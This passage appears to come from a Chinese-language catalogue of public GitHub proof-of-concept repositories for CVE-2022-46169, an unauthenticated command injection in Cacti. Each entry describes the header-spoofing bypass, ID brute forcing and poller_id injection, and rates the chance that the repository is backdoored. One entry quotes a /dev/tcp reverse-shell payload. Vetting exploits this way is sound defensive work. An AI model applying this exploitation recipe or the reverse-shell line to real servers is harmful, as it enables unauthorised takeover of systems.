3.  攻击者构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。
4.  服务器执行恶意命令，攻击者获得对服务器的控制权。

**项目地址:** [r1nzleer/RCE-Cacti-1.2.22](https://github.com/r1nzleer/RCE-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #29

**来源**: [CVE-2022-46169-ruycr4ft_CVE-2022-46169.md](../2022/CVE-2022-46169-ruycr4ft_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统上存在具有`POLLER_ACTION_SCRIPT_PHP` action类型的poller_item配置，并且能够通过伪造HTTP头绕过身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是一个存在于Cacti 1.2.23之前版本中的未经身份验证的命令注入漏洞。该漏洞存在于`remote_agent.php`文件中。攻击者可以通过伪造`X-Forwarded-For`等HTTP头来绕过身份验证，利用`get_client_addr`函数的缺陷，使其返回运行Cacti服务器的IP地址。然后，通过`polldata` action，攻击者可以控制`poller_id`参数，由于该参数未经过滤就被传递给`proc_open`函数执行，从而导致命令注入。PoC代码首先检查目标是否易受攻击，然后通过暴力破解`host_id`和`local_data_ids`来找到具有`POLLER_ACTION_SCRIPT_PHP` action的`poller_item`。 找到有效的`host_id`和`local_data_ids`后，将构造包含恶意payload的URL并发送到目标系统。攻击者可以利用此漏洞在目标服务器上执行任意命令，例如下载恶意软件或窃取敏感数据。

**投毒风险分析：**

PoC代码主要功能是利用漏洞，但存在轻微的投毒风险：

1.  **Payload来源：** PoC代码要求用户输入IP地址和端口，然后生成反向shell的payload。如果用户不小心输入了错误的IP地址或端口，可能会导致连接到错误的服务器，或者暴露自己的IP地址。
2.  **依赖外部资源：** PoC依赖于`requests`和`urllib.parse`库，这些库可能存在安全问题或被篡改，但可能性较低。
3.  **Payload执行环境：** 生成的payload在目标服务器上执行，如果目标服务器的安全配置不当，可能会被恶意利用。
4.  **代码可读性：** 代码相对清晰，没有明显的恶意行为，但仍然需要仔细审查。

总体来说，PoC代码的投毒风险较低，主要是由于用户输入和执行环境带来的风险。如果代码是从可信来源获取，并且用户仔细审查过代码，那么风险可以忽略不计。

**项目地址:** [ruycr4ft/CVE-2022-46169](https://github.com/ruycr4ft/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #30

**来源**: [CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md](../2022/CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在至少一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵`remote_agent.php`文件中的`poller_id`参数来执行任意操作系统命令。漏洞利用主要分为两个阶段：首先，通过设置`X-Forwarded-For`头绕过身份验证，伪造客户端IP地址，使其与Cacti服务器的IP地址匹配。然后，构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，最终导致命令注入。该POC代码通过循环尝试不同的`host_id`来发现可以利用的配置。POC代码没有发现明显的投毒行为，主要目的是利用漏洞执行命令。搜索引擎结果也表明该漏洞已被公开利用。

**项目地址:** [sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #31

**来源**: [CVE-2022-46169-yassinebk_CVE-2022-46169.md](../2022/CVE-2022-46169-yassinebk_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务运行且存在特定的数据源配置（poller_item具有POLLER_ACTION_SCRIPT_PHP action）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未授权命令注入漏洞。攻击者可以利用`remote_agent.php`文件中的授权绕过缺陷，通过伪造HTTP头（例如`X-Forwarded-For`），绕过IP地址验证，并利用`polldata`操作中的`poller_id`参数进行命令注入。

**漏洞利用方式：**

1.  **授权绕过：** 通过设置`X-Forwarded-For` HTTP头，模拟Cacti服务器自身的IP地址，绕过`remote_agent.php`的授权检查。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，攻击者可以控制这些变量。
2.  **ID爆破：** 爆破`host_id`和`local_data_id`参数，寻找一个`poller_item`记录，其`action`字段的值为`POLLER_ACTION_SCRIPT_PHP` (值为2)，表明该条目会执行PHP脚本。
3.  **命令注入：** 将恶意命令注入到`poller_id`参数中。由于`get_nfilter_request_var`函数没有充分过滤该参数，导致命令注入。
4.  **远程代码执行：** 通过`proc_open`函数执行注入的命令，从而实现远程代码执行。

**有效性分析：**

根据漏洞描述和提供的POC代码，该漏洞利用方式是有效的。POC代码首先检查目标是否存在漏洞，然后通过爆破`host_id`和`local_data_id`找到合适的`poller_item`记录，最后构造包含恶意命令的URL并发送请求，实现远程代码执行。

**投毒风险分析：**

分析提供的POC代码，没有发现明显的恶意代码或后门。脚本的功能集中于漏洞利用，没有其他可疑操作。因此，投毒风险评估为0%。

**项目地址:** [yassinebk/CVE-2022-46169](https://github.com/yassinebk/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---



---

## POC #8

**来源**: [CVE-2022-46169-MarkStrendin_CVE-2022-46169.md](../2022/CVE-2022-46169-MarkStrendin_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** Cacti服务器运行，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item，需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求绕过身份验证，并利用 `remote_agent.php` 文件中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者可以通过设置 `X-Forwarded-For` 或其他 `HTTP_` 开头的 HTTP Header，伪造客户端IP地址，使其与Cacti服务器自身的IP地址相同。`get_client_addr` 函数会读取这些header，然后 `gethostbyaddr` 函数将伪造的IP解析为主机名。由于 Cacti 的 `poller` 表中默认存在服务器自身的主机名记录，因此绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 参数的请求，并指定 `host_id`、`local_data_ids[]` 和 `poller_id`。其中，`poller_id` 参数没有经过充分的过滤，攻击者可以在 `poller_id` 中注入恶意命令。
3.  **寻找合适的poller_item：** 为了触发命令注入，需要存在一个 `poller_item`，其 `action` 字段的值为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，用于利用 CVE-2022-46169 漏洞。该脚本首先检查目标是否易受攻击，然后暴力破解 `host_id` 和 `local_data_id`，以便找到具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。 一旦找到，它会构造一个包含恶意负载的 HTTP 请求并发送到 `remote_agent.php`。

**投毒风险分析：**

该代码主要目的是发送payload以获得反向shell，并没有发现恶意修改或删除文件等高危操作。代码的功能基本符合描述，但仍然存在一些潜在风险。

*   **依赖风险：** 代码依赖 `requests` 库，如果 `requests` 库被恶意篡改，可能会导致安全问题。
*   **配置错误：** 攻击者可能会错误配置 `attacker_ip` 和 `attacker_port`，导致攻击失败或暴露自己的IP地址。

根据以上分析，该POC存在较低的投毒风险。 代码的主要功能是利用已知漏洞，没有发现额外的恶意代码或隐藏功能，但也不能完全排除攻击者在实际使用中进行修改以达到其他目的的可能性。 风险评估较低，约为5%。

**结论：**

该漏洞的利用较为直接，POC代码有效。 漏洞存在投毒风险，但风险较低。

**项目地址:** [MarkStrendin/CVE-2022-46169](https://github.com/MarkStrendin/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #9

**来源**: [CVE-2022-46169-N1arut_CVE-2022-46169_POC.md](../2022/CVE-2022-46169-N1arut_CVE-2022-46169_POC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #10

**来源**: [CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md](../2022/CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵`remote_agent.php`文件中的输入，利用`poller_id`参数执行任意操作系统命令。攻击流程如下：

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`头绕过身份验证。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，允许攻击者伪造客户端IP地址，从而通过`poller`表中的主机名检查。
2.  **触发命令注入：** 绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。`poll_for_data`函数检索请求参数并加载相应的`poller_item`条目。如果`poller_item`的`action`等于`POLLER_ACTION_SCRIPT_PHP`，则使用`proc_open`执行PHP脚本。`poller_id`参数在传递给`proc_open`之前未经过充分过滤，从而导致命令注入。
3.  **漏洞利用代码分析：**  `poc.sh` 脚本首先解析用户提供的参数（目标URL、本地IP和端口），然后构造反向shell的payload，并对其进行URL编码。脚本通过发送带有`X-Forwarded-For`头的HTTP请求来检查目标是否易受攻击。该脚本通过暴力破解`host_id`和`local_data_ids`来枚举有效的URL。最后，它使用构造的payload向目标发送一个请求，从而触发反向shell。
4.  **投毒风险评估：**  该POC的主要目的是利用漏洞实现反向Shell。检查`poc.sh`脚本，发现脚本本身主要功能是生成Payload、URL编码、发送HTTP请求。虽然存在修改反向连接IP和端口的可能性，但没有发现明显的恶意代码或后门。`README.md`中建议访问的GitHub仓库 (`https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application`)，用于搭建漏洞环境，**存在一定风险，应该注意**。总体而言，脚本投毒风险较低，初步评估为5%。风险主要来自于下载其他来源的poc，或者使用poc访问陌生的网址。
5.  **有效性评估:** 该POC的有效性较高，因为它可以自动化漏洞利用过程，从身份验证绕过到命令执行。多个搜索引擎结果表明该漏洞已被积极利用。
6.  **利用方式总结：** 通过伪造HTTP头绕过身份验证，然后利用未过滤的`poller_id`参数在`remote_agent.php`中注入命令，最终实现远程代码执行。

**项目地址:** [RdBBB3/SHELL-POC-CVE-2022-46169](https://github.com/RdBBB3/SHELL-POC-CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #11

**来源**: [CVE-2022-46169-Rickster5555_EH2-PoC.md](../2022/CVE-2022-46169-Rickster5555_EH2-PoC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响版本的Cacti，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中存在的一个命令注入漏洞，允许未经身份验证的攻击者在服务器上执行任意命令。漏洞存在于`remote_agent.php`文件中，由于对客户端IP地址的验证不严谨，攻击者可以通过设置`X-Forwarded-For`等HTTP头部绕过身份验证。绕过验证后，可以调用`polldata`动作，并利用`poller_id`参数的命令注入漏洞执行系统命令。

**利用方式：**

1.  攻击者发送带有恶意`X-Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含命令注入的`poller_id`参数的HTTP请求，发送到`remote_agent.php`，执行任意系统命令。 为了成功利用，必须存在一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP`（值为2）。

**POC有效性：**

提供的PoC代码通过发送带有特定HTTP头部的GET请求，利用`poller_id`参数执行命令注入。根据漏洞描述和PoC代码，该PoC是有效的，可以用于验证漏洞的存在。

**投毒风险：**

查看提供的文件，包括`README.md`、`cacti-CI-poc.py`、`docker-compose.yml`和`entrypoint.sh`。

*   `README.md`：包含漏洞描述、复现步骤和参考链接，没有发现恶意代码。
*   `cacti-CI-poc.py`：PoC脚本，用于发送HTTP请求触发命令注入，没有发现恶意代码，但利用时执行的命令完全由使用者控制，具有潜在风险。
*   `docker-compose.yml`：Docker Compose配置文件，用于构建包含漏洞版本的Cacti环境，没有发现恶意配置。
*   `entrypoint.sh`：Docker容器的入口脚本，用于初始化Cacti数据库和设置权限，没有发现明显的恶意代码，但其中`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"`语句禁用了管理员密码强制修改，这可能会降低安全性。

总体来说，该仓库的投毒风险较低，但入口脚本中禁用了管理员密码强制修改，存在潜在的安全风险。

投毒风险评估：5%。

**项目地址:** [Rickster5555/EH2-PoC](https://github.com/Rickster5555/EH2-PoC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #12

**来源**: [CVE-2022-46169-Safarchand_CVE-2022-46169.md](../2022/CVE-2022-46169-Safarchand_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个命令注入漏洞。攻击者可以通过构造`X-Forwarded-For`头绕过身份验证，然后利用`remote_agent.php`中的`polldata`操作注入恶意命令。该POC利用`X-Forwarded-For`头伪造客户端IP，绕过身份验证，然后通过`poller_id`参数向`proc_open`函数传递恶意payload，从而执行任意命令。POC尝试通过暴力破解`host_id`来找到一个可用的`poller_item`。代码中使用了`pexpect`来创建一个交互式的nc会话，以便接收反向shell。虽然使用了base64编码，但这是为了避免命令中的特殊字符导致问题，不是隐藏恶意代码，但是通过nc反弹shell存在被利用进行恶意操作的风险，因此存在一定的投毒风险，但是概率较低。整体而言，POC代码目的是为了验证漏洞存在，因此投毒概率较低，约为10%。

**漏洞利用方式：**

1.  **绕过认证：** 通过设置`X-Forwarded-For`头为Cacti服务器的IP地址，欺骗`get_client_addr`函数，绕过认证。
2.  **触发命令注入：**  向`remote_agent.php`发送包含`polldata` action的请求，并将恶意命令注入到`poller_id`参数中。  利用`proc_open`函数执行注入的命令。
3. **反弹shell:** 该poc通过反弹shell获得服务器控制权。

**项目地址:** [Safarchand/CVE-2022-46169](https://github.com/Safarchand/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #13

**来源**: [CVE-2022-46169-SystemVll_CVE-2022-46169.md](../2022/CVE-2022-46169-SystemVll_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头中的`Forwarded-For`字段，绕过身份验证，然后通过`remote_agent.php`文件中的`polldata`操作，并结合一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，将恶意命令注入到`proc_open`函数中执行，从而实现远程代码执行。

**漏洞利用方式:**
1.  **身份验证绕过:** 通过设置`Forwarded-For`等HTTP头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入:**  发送带有恶意`poller_id`参数的请求到`remote_agent.php?action=polldata`，该参数会被插入到`proc_open`函数执行的命令中。
3.  **寻找`POLLER_ACTION_SCRIPT_PHP`:**  漏洞利用的前提是存在一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。需要找到对应的`host_id`和`local_data_id`。

**有效性:**
根据漏洞描述，此漏洞利用代码利用了未经授权的远程代理来执行任意系统命令，因此有效。

**投毒风险:**
提供的代码段是 Apache 2.0 许可协议，不包含任何可执行代码或恶意代码，因此投毒风险为0%。核心的PoC代码并没有提供，因此无法判断攻击者是否进行了后门代码验证，只能判断提供的许可协议不存在投毒风险。

**项目地址:** [SystemVll/CVE-2022-46169](https://github.com/SystemVll/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #14

**来源**: [CVE-2022-46169-a1665454764_CVE-2022-46169.md](../2022/CVE-2022-46169-a1665454764_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行Cacti，并且存在具有 'POLLER_ACTION_SCRIPT_PHP' action类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经验证的远程命令执行漏洞。攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并在目标系统上执行任意命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`等HTTP Header, 伪造客户端 IP 地址，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以通过 `polldata` action，并控制 `poller_id` 参数，将恶意命令注入到 `proc_open` 函数的参数中，从而执行任意系统命令。
3.  **前提条件：** 漏洞利用需要存在一个 `poller_item`，其 `action` 字段设置为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。默认安装的Cacti，很可能存在满足此条件的`poller_item`。
4.  **POC有效性:** 提供的POC代码有效, 利用`remote_agent.php`，设置`X-Forwarded-For` header，构造包含恶意命令的URL,发送请求来执行命令。
5. **投毒风险:** README.md 为漏洞复现步骤，以及github仓库的使用方式说明。POC代码本身除了写入output.txt之外没有发现其他恶意行为。虽然存在一定的风险，例如该代码可能被恶意修改后传播，但当前提供的代码投毒概率较低，大约为1%。该POC的主要功能是检测漏洞是否存在并执行命令，而不是植入后门。

**项目地址:** [a1665454764/CVE-2022-46169](https://github.com/a1665454764/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #15

**来源**: [CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md](../2022/CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务可网络访问, 并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，然后利用`polldata`动作，通过构造恶意的`poller_id`参数，执行任意操作系统命令。漏洞利用的关键在于：

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证检查。这是因为`get_client_addr`函数会信任`HTTP_`开头的`$_SERVER`变量，导致可以伪造IP地址。
2.  **命令注入：** 一旦通过身份验证，攻击者可以向`remote_agent.php`发送带有`action=polldata`的请求，其中`poller_id`参数可以被注入恶意命令。程序会将这个参数传递给`proc_open`函数，从而执行攻击者提供的命令。
3.  **利用方式：**  提供的Python脚本首先检查目标是否易受攻击，然后使用提供的LHOST和LPORT生成反向shell有效负载。 脚本通过暴力破解`host_id`和`local_data_ids[]`，构造恶意的URL，发送到目标`remote_agent.php`，从而执行反向shell，从而在目标系统上获得shell访问权限。

**投毒风险分析：**

代码本身主要功能是实现漏洞利用，但仍然存在一定低概率的投毒风险：

*   **潜在的后门：** 虽然代码的主要目的是利用漏洞，但作者可能在payload构建过程中插入了额外的恶意代码，例如，在反向shell payload中添加了额外的命令，用于收集敏感信息或执行其他恶意操作。但是从代码来看，payload是根据用户输入的IP和端口构建的，自定义程度较高，因此payload中存在后门的概率较低。
*   **依赖风险：** 该脚本依赖于`requests`和`urllib`库。虽然这些都是常用的库，但如果这些库本身存在漏洞，或者作者使用了不安全的库函数，可能会引入安全风险。

总体而言，该POC代码的投毒风险较低，约为5%。主要风险在于payload构建过程中可能存在的隐蔽后门，以及对第三方库的依赖。

**项目地址:** [alv-david/CVE-2022-46169-Cacti-1.2.22](https://github.com/alv-david/CVE-2022-46169-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #16

**来源**: [CVE-2022-46169-antisecc_CVE-2022-46169.md](../2022/CVE-2022-46169-antisecc_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在`poller_item`记录，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (2)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中。攻击者可以通过设置 `X-Forwarded-For` HTTP 头绕过身份验证，然后利用 `polldata` 操作，将恶意命令注入到 `poller_id` 参数中，导致服务器执行任意命令。  

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用的**有效性高**。漏洞库和搜索引擎结果都确认了该漏洞的存在和严重性，并且已经有公开的漏洞利用代码可用。提供的 Python 脚本 `CVE-2022-46169.py` 实现了漏洞利用过程，包括绕过身份验证和注入命令。  

**投毒风险分析：**

对提供的 Python 脚本进行分析，该脚本的主要功能是利用 CVE-2022-46169 漏洞，不存在明显的恶意代码或后门。但是，任何利用代码都存在被修改的风险，攻击者可能会在代码中添加恶意功能。考虑到代码量较少，逻辑清晰，用户可以容易地进行审查，因此，**投毒风险较低，估计为5%**。这个风险主要来自使用者没有进行代码审计就直接使用，例如添加反弹shell等恶意操作。

**利用方式：**

1.  **身份验证绕过：** 攻击者发送带有 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，伪造客户端 IP 地址，绕过身份验证。
2.  **命令注入：** 攻击者构造包含恶意命令的 `poller_id` 参数，通过 `polldata` 操作传递给 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器在处理 `polldata` 操作时，会将 `poller_id` 参数中的恶意命令注入到 `proc_open` 函数中，导致服务器执行任意命令。

**POC利用方式详细过程:**

1.  运行 `CVE-2022-46169.py` 脚本，指定目标 Cacti 实例的 URL 和要执行的命令。
2.  脚本会遍历一系列 `host_id`，并为每个 `host_id` 构建一个包含恶意 `poller_id` 参数的 HTTP GET 请求。
3.  脚本设置 `X-Forwarded-For` 头，伪造客户端 IP 地址，绕过身份验证。
4.  脚本发送 HTTP 请求到 `remote_agent.php`。
5.  如果目标 Cacti 实例存在具有 `POLLER_ACTION_SCRIPT_PHP` 操作类型的 `poller_item`，并且成功绕过身份验证，则服务器将执行 `poller_id` 参数中的恶意命令。
6.  脚本会检查响应中是否包含 "proc" 字符串，以确认命令是否已成功执行。
7.  如果命令执行成功，脚本将输出成功的消息，并显示成功利用的 `host_id`。

**项目地址:** [antisecc/CVE-2022-46169](https://github.com/antisecc/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #17

**来源**: [CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md](../2022/CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例配置了 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者在运行Cacti的服务器上执行任意代码。漏洞存在于`remote_agent.php`文件中，该文件可以通过发送特制的HTTP请求进行访问。攻击者可以通过操纵`X-Forwarded-For` header 绕过身份验证,然后通过 `poller_id`参数执行命令注入。PoC代码利用了这一漏洞，首先验证目标是否存在漏洞，然后暴力破解 `host_id`和 `local_data_id`。 一旦这些ID被找到，攻击者就可以构造包含恶意payload的请求，从而在服务器上执行任意命令。

**有效性:**  提供的PoC代码有效，能够成功利用漏洞实现未经身份验证的远程命令执行。

**投毒风险:**  PoC代码主要功能是漏洞利用，并没有发现明显的恶意投毒代码，例如植入后门、篡改数据等。`cacti.py`脚本的主要功能是：
1.  检测目标是否存在漏洞。
2.  爆破 `host_id` 和 `local_data_id`。
3.  执行命令注入。
